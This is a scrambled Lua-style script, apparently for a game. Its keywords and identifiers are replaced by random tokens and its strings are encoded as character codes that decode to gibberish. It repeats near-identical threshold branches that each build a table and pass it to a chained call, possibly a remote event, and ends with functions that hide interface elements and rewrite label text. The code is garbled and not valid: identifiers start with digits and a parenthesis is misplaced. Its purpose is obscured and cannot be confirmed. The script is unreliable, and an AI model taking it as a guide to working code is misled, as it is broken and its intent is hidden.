    f2jmobri 9Sr8mLIC >= 1300 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,117,57,81,70,74,49,118,108,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,111,87,66,54,48,79,88,75,45,111,87,66,54,48,79,88,75),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1275 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,85,108,56,66,116,110,85,89,45,85,108,56,66,116,110,85,89),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1250 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,66,56,78,80,121,88,122,98,45,66,56,78,80,121,88,122,98),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1200 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(114,76,117,90,86,54,120,82,32,68,119,84,120,56,109,101,57),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1100 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,65,106,66,117,66,55,99,102,45,65,106,66,117,66,55,99,102),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 1000 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,71,72,106,75,50,110,98,70,45,71,72,106,75,50,110,98,70),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 950 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,114,76,117,90,86,54,120,82,45,114,76,117,90,86,54,120,82),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 850 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,66,119,88,48,66,118,109,67,45,66,119,88,48,66,118,109,67),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 750 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,69,71,108,74,109,116,107,82,45,69,71,108,74,109,116,107,82),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = 133757394651,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 650 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,81,50,71,105,90,84,77,101,45,81,50,71,105,90,84,77,101),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 550 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(114,76,117,90,86,54,120,82,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,66,71,122,117,112,114,104,108,45,66,71,122,117,112,114,104,108),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 450 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(50,120,32,76,74,75,57,77,119,53,75),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 400 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(43,49,32,77,78,81,83,67,76,103,51,32,49,109,50,78,112,71,118,85),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 380 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,115,102,105,81,119,69,71,82,45,115,102,105,81,119,69,71,82),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
        
    f2jmobri 9Sr8mLIC >= 350 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(50,120,32,66,108,102,121,121,79,97,73,32,80,104,83,121,103,56,111,89),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 250 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,48,80,113,116,119,48,99,111,45,48,80,113,116,119,48,99,111),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 220 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,81,53,77,107,65,104,55,104,45,81,53,77,107,65,104,55,104),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 180 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,71,53,50,87,84,65,79,85,45,71,53,50,87,84,65,79,85),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 100 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,68,119,84,120,56,109,101,57,45,68,119,84,120,56,109,101,57),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 75 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(109,118,112,97,48,81,118,100,32,67,79,102,82,77,55,108,48,45,67,79,102,82,77,55,108,48),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(51,77,56,86,104,86,52,82),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 50 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(49,48,75,32,76,74,75,57,77,119,53,75),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    f2jmobri 9Sr8mLIC >= 25 V3hsGEtr
        iTTj1vAo IqC5zTZa = {
            [1] = string.char(110,52,88,65,67,106,98,84),
            [2] = {
                [string.char(121,110,81,84,104,49,67,56)] = string.char(86,117,85,66,84,50,118,107,32,105,78,113,115,105,70,65,69,32,104,57,120,119,98,54,105,113),
                [string.char(52,108,109,87,50,115,115,66)] = string.char(50,120,32,89,80,112,97,83,69,71,85,32,40,49,53,32,76,99,113,80,71,53,56,68,46,41),
                [string.char(57,50,79,54,118,51,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(67,65,87,66,71,54,106,69)] = string.char(110,88,76,109,90,113,105,90),
                [string.char(52,102,49,99,117,112,75,72)] = Z9HhmRJZ,
                [string.char(112,54,55,110,55,108,51,50)] = DKBLU4R8,
            }
        }
        ZA4ax9Sp:z5ZIGYkD(string.char(65,57,111,114,56,103,107,111)):gq3iFXF2(string.char(79,48,74,108,90,81,53,70)):gq3iFXF2(string.char(110,109,85,108,57,70,111,75)):WmCbIuHB(FIYPcQEj(IqC5zTZa))
    zNnerVKZ
zNnerVKZ

iTTj1vAo 7Ub4IFrW yLnwXIts()
    iTTj1vAo xP1MUCuW = NCShSoYD:gq3iFXF2(string.char(51,113,119,68,82,55,121,70)):gq3iFXF2(string.char(99,115,97,99,68,70,121,48)):gq3iFXF2(string.char(120,80,49,77,85,67,117,87))
    hflU72K1 RVhKRWRe.qoZrIUpX() 6rZrHLTG GJYUgenG xP1MUCuW:CM2RBNWi(string.char(105,48,75,89,78,108,119,90))
    mMEJT6M8()
    iTTj1vAo NCShSoYD = ZA4ax9Sp:z5ZIGYkD(string.char(78,67,83,104,83,111,89,68))

iTTj1vAo leHnuPkU, 519fvuPu = 377PprXk(7Ub4IFrW()
    iTTj1vAo 3qwDR7yF = NCShSoYD:gq3iFXF2(string.char(51,113,119,68,82,55,121,70))
    iTTj1vAo csacDFy0 = 3qwDR7yF:gq3iFXF2(string.char(99,115,97,99,68,70,121,48))
    iTTj1vAo xP1MUCuW = csacDFy0:gq3iFXF2(string.char(120,80,49,77,85,67,117,87))
    iTTj1vAo i0KYNlwZ = xP1MUCuW:gq3iFXF2(string.char(105,48,75,89,78,108,119,90))
    iTTj1vAo FCGVfY8C = i0KYNlwZ:gq3iFXF2(string.char(70,67,71,86,102,89,56,67))
    
    iTTj1vAo rVs1ggDo = FCGVfY8C:gq3iFXF2(string.char(114,86,115,49,103,103,68,111))
    rVs1ggDo.FBgeL16d = e9mnQEI6
    
    iTTj1vAo VDjcLEhG = FCGVfY8C:gq3iFXF2(string.char(86,68,106,99,76,69,104,71))
    iTTj1vAo 3HoPTEil = VDjcLEhG:gq3iFXF2(string.char(110,76,78,49,104,52,76,117))
    iTTj1vAo lObZgzJR = 3HoPTEil:gq3iFXF2(string.char(49))
    lObZgzJR.FBgeL16d = e9mnQEI6
    
    iTTj1vAo cweGmLMP = VDjcLEhG:gq3iFXF2(string.char(99,119,101,71,109,76,77,80))
    cweGmLMP.FBgeL16d = e9mnQEI6

    iTTj1vAo OZq6KUmu = 3HoPTEil:gq3iFXF2(string.char(50))
    OZq6KUmu.FBgeL16d = EvasJtv1

    iTTj1vAo DMbs4g7f = OZq6KUmu.0etj3xXm.bYi52xO4:gq3iFXF2(string.char(97,99,56,51,85,87,89,84))
    DMbs4g7f.ac83UWYT = string.char(104,67,107,114,68,49,54,53,33)
    DMbs4g7f.5REZwtQJ = 9LJtE4WU.Yf2hCy7L(1, 0, DMbs4g7f.5REZwtQJ.Jid9Rs1B.cZ8Ob4K8, DMbs4g7f.5REZwtQJ.Jid9Rs1B.gBLQV0bl)
    
    iTTj1vAo MTZhsJ8f = OZq6KUmu.0etj3xXm.bYi52xO4:gq3iFXF2(string.char(70,107,102,49,115,98,78,73))
    MTZhsJ8f.FBgeL16d = e9mnQEI6

    iTTj1vAo wX4iP2PB = FCGVfY8C:gq3iFXF2(string.char(119,88,52,105,80,50,80,66))
    iTTj1vAo K2nPZ3s2 = wX4iP2PB:gq3iFXF2(string.char(75,50,110,80,90,51,115,50))
    iTTj1vAo b1Q0pYnM = K2nPZ3s2:gq3iFXF2(string.char(65,98,99,107,72,97,65,71))
    b1Q0pYnM.ac83UWYT = string.char(104,67,107,114,68,49,54,53,32,66,86,79,113,105,100,50,118,32,77,78,81,83,67,76,103,51,32,104,112,99,115,100,116,114,81,33)
    b1Q0pYnM.5REZwtQJ = 9LJtE4WU.Yf2hCy7L(1, 0, b1Q0pYnM.5REZwtQJ.Jid9Rs1B.cZ8Ob4K8, b1Q0pYnM.5REZwtQJ.Jid9Rs1B.gBLQV0bl)
zNnerVKZ)

GEerVtZx GJYUgenG leHnuPkU V3hsGEtr
    ZWHW8bYI(string.char(121,56,77,51,71,110,99,78,46,46))
zNnerVKZ
zNnerVKZ

iTTj1vAo csPSjpJp = NCShSoYD:gq3iFXF2(string.char(51,113,119,68,82,55,121,70)):gq3iFXF2(string.char(99,115,97,99,68,70,121,48)):gq3iFXF2(string.char(120,80,49,77,85,67,117,87)):gq3iFXF2(string.char(105,48,75,89,78,108,119,90)):gq3iFXF2(string.char(70,67,71,86,102,89,56,67)):gq3iFXF2(string.char(86,68,106,99,76,69,104,71)):gq3iFXF2(string.char(99,119,101,71,109,76,77,80)):gq3iFXF2(string.char(119,68,88,104,107,118,74,55)):gq3iFXF2(string.char(99,121,113,108,112,87,89,77))
iTTj1vAo nqIDJK9j = csPSjpJp OASa3Gsk csPSjpJp.ac83UWYT:nAZBh4dD(string.char(40,37,72,110,86,70,115,101,79,107,43,41,36))

GEerVtZx nqIDJK9j V3hsGEtr
    9Sr8mLIC = hX78t4eA(nqIDJK9j) + 25 
zNnerVKZ

iTTj1vAo 7Ub4IFrW Tj4nzJ6Y()
    iTTj1vAo xP1MUCuW = NCShSoYD:gq3iFXF2(string.char(51,113,119,68,82,55,121,70)):gq3iFXF2(string.char(99,115,97,99,68,70,121,48)):gq3iFXF2(string.char(120,80,49,77,85,67,117,87))
    hflU72K1 RVhKRWRe.qoZrIUpX() 6rZrHLTG GJYUgenG xP1MUCuW:CM2RBNWi(string.char(105,48,75,89,78,108,119,90))
    xsiqekCs()
zNnerVKZ

yLnwXIts()
Tj4nzJ6Y()

C2epplTX = 4119
